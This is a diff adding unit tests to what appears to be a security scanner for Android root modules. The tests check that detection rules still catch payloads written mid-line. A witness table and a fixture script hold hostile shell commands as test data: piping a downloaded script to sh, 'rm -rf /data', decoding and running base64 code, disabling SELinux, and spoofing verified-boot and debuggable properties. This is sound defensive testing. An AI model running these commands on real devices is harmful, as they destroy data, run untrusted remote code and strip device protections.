@@ -2232,3 +2232,148 @@ test('fix4-P13 端到端：customize.sh 里 printf >> system.prop 的模块不�
   assert.equal(ok.riskLevel, 'low');
   assert.equal(ok.decision.action, 'auto-approve');
 });
+
+// —— P14：锚点闭包 ——
+// 三条硬要求：
+//   ① 每条 line 规则都要声明 anchor ∈ {'line-start','anywhere'}；缺声明 = 红，**不许跳过**
+//      （「缺就跳过」正是装饰性守卫的形状，变异 (c) 就是冲它来的）；
+//   ② 声明 anywhere 的规则必须扛住一行前缀（ANCHOR_PREFIX + 已知载荷）；声明 line-start 的规则
+//      必须指名 sibling，并且同一载荷的「脚本写出」形态在 sibling 上真的命中；
+//   ③ 删掉失败的那条规则不算修好：固定的必备 id 清单 + 规则数地板 + witness 表与规则表互为定义，
+//      再加覆盖度地板（这张表跳过的规则数必须是 0）。
+// 这里不重写任何模式匹配：断言全部走 shipped 规则的 scan()。
+const ANCHOR_PREFIX = 'x=1; ';
+
+const ANCHOR_WITNESS = {
+  RM_RF_MUTABLE: { payload: 'rm -rf /data' },
+  PIPE_TO_SHELL: { payload: 'curl -s https://abc.cc/x.sh | sh' },
+  EXEC_BUNDLED_FILE: { payload: 'sh $MODDIR/payload.bin' },
+  EXEC_INDIRECT: { payload: 'sh $PAYLOAD' },
+  MODDIR_RUNTIME_WRITE: { payload: 'unzip -q -d $MODDIR /sdcard/p.zip' },
+  DOWNLOAD_TO_STDOUT: { payload: 'wget -q -O- https://abc.cc/x' },
+  OBFUSCATED_DECODE_EXEC: { payload: 'echo $B64 | base64 -d | sh' },
+  OBFUSCATED_DECODE_ONLY: { payload: 'echo $B64 | base64 -d > /data/local/tmp/out' },
+  WRITE_SYSTEM_VENDOR: { payload: 'echo x >> /system/etc/hosts' },
+  SELINUX_DISABLE: { payload: 'setenforce 0' },
+  HOSTS_MODIFY: { payload: 'sed -i "s/^/#/" /system/etc/hosts' },
+  SELINUX_POLICY_RELAX: { payload: 'allow su * * { execute };' },
+  SELINUX_TYPE_PERMISSIVE: { payload: 'typepermissive su;' },
+  MAGISK_POLICY_LIVE: { payload: 'magiskpolicy --live "allow su * *"' },
+  VERIFIED_BOOT_SPOOF: { payload: 'resetprop -w ro.boot.verifiedbootstate green' },
+  DEBUGGABLE_ENABLE: { payload: 'setprop ro.secure 0' },
+  PROP_BOOT_SPOOF: {
+    payload: 'ro.boot.verifiedbootstate=green',
+    prefixed: 'printf "ro.boot.verifiedbootstate=green\\n" >> /data/adb/modules/x/system.prop',
+  },
+  PROP_SECURITY_WEAKEN: {
+    payload: 'ro.debuggable=1',
+    prefixed: 'printf "ro.debuggable=1\\n" >> /data/adb/modules/x/system.prop',
+  },
+  HARDCODED_IP: { payload: 'ping -c1 8.8.8.8' },
+  SUSPICIOUS_DOMAIN: { payload: 'curl -s https://track.xyz/p' },
+  NETWORK_FETCH: { payload: 'curl -s https://example.com/x' },
+  PRIVACY_HOME_USER: { payload: 'cp /home/realuser/x .' },
+  PRIVACY_EMAIL: { payload: 'contact=author@realmail.com' },
+  PRIVACY_SECRET: { payload: 'API_KEY=Ab3dEfGh1j' },
+};
+
+const REQUIRED_RULE_IDS = Object.keys(ANCHOR_WITNESS);
+
+test('fix4-P14：锚点闭包表 —— 每条 line 规则声明 anchor，沉默必须有 witness，跳过与删规则都不算修好', () => {
+  // ③-1 必备 id 清单：不许靠「把失败的那条规则删了」把这张表变绿
+  for (const id of REQUIRED_RULE_IDS) {
+    assert.ok(RULES_BY_ID[id], `${id} 不在规则表里 —— 锚点闭包不能靠删规则来「修」`);
+  }
+  assert.ok(CONTENT_RULES.length >= REQUIRED_RULE_IDS.length,
+    `内容规则从 ${REQUIRED_RULE_IDS.length} 条缩到了 ${CONTENT_RULES.length} 条`);
+  assert.equal(new Set(CONTENT_RULES.map((r) => r.id)).size, CONTENT_RULES.length, '规则 id 不许重复');
+  // ③-2 witness 表与规则表互为定义：加规则要给 payload，删规则要删 witness，两个方向都拦
+  for (const id of REQUIRED_RULE_IDS) {
+    assert.ok(CONTENT_RULES.some((r) => r.id === id), `锚点表点名了 ${id}，规则表里却没有它`);
+  }
+
+  const ANCHORS = new Set(['line-start', 'anywhere']);
+  let covered = 0;
+  let anywhere = 0;
+  let lineStart = 0;
+  for (const r of CONTENT_RULES) {
+    // ① 声明必须存在且合法 —— 默认值只许住在工厂里；这张表里写 `r.anchor ?? 'anywhere'` 就是装饰品
+    assert.equal(typeof r.anchor, 'string',
+      `${r.id} 没有 anchor 声明（实际 ${String(r.anchor)}）：沉默必须显式声明才成立`);
+    assert.ok(ANCHORS.has(r.anchor), `${r.id} 的 anchor="${r.anchor}" 不在 'line-start' | 'anywhere' 里`);
+    const w = ANCHOR_WITNESS[r.id];
+    assert.ok(w && w.payload, `${r.id} 有 anchor 声明却没有锚点 witness —— 没人对账的声明是空话`);
+    assert.equal(hits(r.id, w.payload).length, 1,
+      `${r.id} 的 witness 载荷本身要恰好命中 1 条：${w.payload}`);
+
+    if (r.anchor === 'anywhere') {
+      anywhere++;
+      const h = hits(r.id, ANCHOR_PREFIX + w.payload);
+      assert.ok(h.length > 0,
+        `${r.id} 声明 anywhere，但前缀行「${ANCHOR_PREFIX}${w.payload}」0 命中 —— 行首锚点又回来了`);
+      assert.equal(h[0].ruleId, r.id);
+    } else {
+      lineStart++;
+      // ② 声明 line-start 就必须指名那一支「脚本写出」的 sibling，且它真的打得住前缀形态
+      assert.ok(w.prefixed, `${r.id} 声明 line-start 却没给出「脚本写出」形态的 witness`);
+      assert.ok(r.anchorSibling, `${r.id} 声明 line-start 却没命名 sibling —— 声明必须有 witness`);
+      const sib = RULES_BY_ID[r.anchorSibling];
+      assert.ok(sib, `${r.id} 的 sibling="${r.anchorSibling}" 在规则表里不存在`);
+      assert.ok(sib.anchor === 'anywhere' || sib.id === r.id,
+        `${r.id} 的 sibling ${sib.id} 自己不覆盖行中形态（anchor=${String(sib.anchor)}）`);
+      const h = sib.scan('service.sh', ANCHOR_PREFIX + w.prefixed).filter((f) => f.severity != null);
+      assert.ok(h.length > 0,
+        `${r.id} 的 sibling ${r.anchorSibling} 在前缀形态下 0 命中：${ANCHOR_PREFIX}${w.prefixed} —— 那一支是假的`);
+      assert.equal(h[0].ruleId, sib.id);
+    }
+    covered++;
+  }
+  // ③-3 覆盖度地板：这张表一条都不许跳过（任何 `continue` 分支都会在这里露出来）
+  assert.equal(covered, CONTENT_RULES.length, '锚点闭包表必须覆盖每一条规则，一条都不许跳过');
+  assert.equal(anywhere + lineStart, CONTENT_RULES.length);
+  assert.ok(anywhere >= 21, `anywhere 支只剩 ${anywhere} 条：规则不许悄悄退回行首锚定`);
+  assert.ok(lineStart >= 2, `line-start 支只剩 ${lineStart} 条：两条 .prop 规则都要声明`);
+});
+
+test('fix4-P14：anchor 声明与规则自己的分支形状对得上（RELAX 改 anywhere，两条 .prop 规则声明 line-start 各有 sibling）', () => {
+  assert.equal(RULES_BY_ID.SELINUX_POLICY_RELAX.anchor, 'anywhere',
+    'P12 之后 RELAX 不再要求行首，声明必须跟着改 —— 否则下一轮又有人拿 anchor 当挡箭牌');
+  assert.ok(!/^\^\\s\*allow/.test(RULES_BY_ID.SELINUX_POLICY_RELAX.pattern.source),
+    `RELAX 的 pattern 还留着行首锚：${RULES_BY_ID.SELINUX_POLICY_RELAX.pattern.source}`);
+  for (const id of ['PROP_BOOT_SPOOF', 'PROP_SECURITY_WEAKEN']) {
+    const r = RULES_BY_ID[id];
+    assert.equal(r.anchor, 'line-start', `${id} 的行首一支是真的（.prop 的键就在行首），必须声明出来`);
+    assert.equal(r.anchorSibling, id, 'P13 的第二支就在同一条规则里：sibling 指向自己');
+    assert.ok(r.pattern.source.includes('>>'), `${id} 的第二支要认得写出重定向，否则 sibling 是空的`);
+    // 行首一支不许因为加了第二支而失效
+    assert.ok(/^\(\?:\^|\\s\*\w/.test(r.pattern.source) || r.pattern.source.includes('^\\s*'),
+      `${id} 丢了行首那一支：${r.pattern.source}`);
+  }
+  // 工厂负责物化默认值：每张规则对象上都得有这一个字段，而不是测试替它补
+  for (const r of CONTENT_RULES) {
+    assert.ok('anchor' in r, `${r.id} 的对象上没有 anchor 字段`);
+  }
+});
+
+test('fix4-P14 端到端：同一族的前缀写法一起进报告，不再靠某一条邻居规则兜着', async () => {
+  // 如实写着：这一份夹具在 P14 之前并不是 low —— `>> $MODDIR/system.prop` 被邻居规则
+  // MODDIR_RUNTIME_WRITE 抓成 high（实测 eval.f4p14 旧行为：high，但只有那两条）。
+  // 这里要证的是**这三条规则自己**都得说话：定级由邻居兜着，等于把「这一族看不看得见」
+  // 押在一条意图完全不同的规则上；同一族的相对路径写法（P13 端到端）旧行为是 low → auto-approve。
+  const r = await scanToReport(makeModuleZip({ id: 'eval.f4p14', files: [
+    ['module.prop', moduleProp('eval.f4p14')],
+    ['service.sh', [
+      '#!/system/bin/sh',
+      'MODDIR=${0%/*}',
+      'x=1; allow su * * { execute };',
+      'x=1; printf "ro.boot.verifiedbootstate=green\\n" >> $MODDIR/system.prop',
+      'x=1; printf "ro.debuggable=1\\n" >> $MODDIR/system.prop',
+    ].join('\n') + '\n'],
+  ] }), { changeType: 'first' });
+  const ids = r.findings.filter((f) => f.line >= 3).map((f) => `${f.ruleId}@${f.line}`);
+  for (const id of ['SELINUX_POLICY_RELAX', 'PROP_BOOT_SPOOF', 'PROP_SECURITY_WEAKEN']) {
+    assert.ok(r.findings.some((f) => f.ruleId === id), `${id} 在前缀形态下仍然 0 命中：${JSON.stringify(ids)}`);
+  }
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
+});
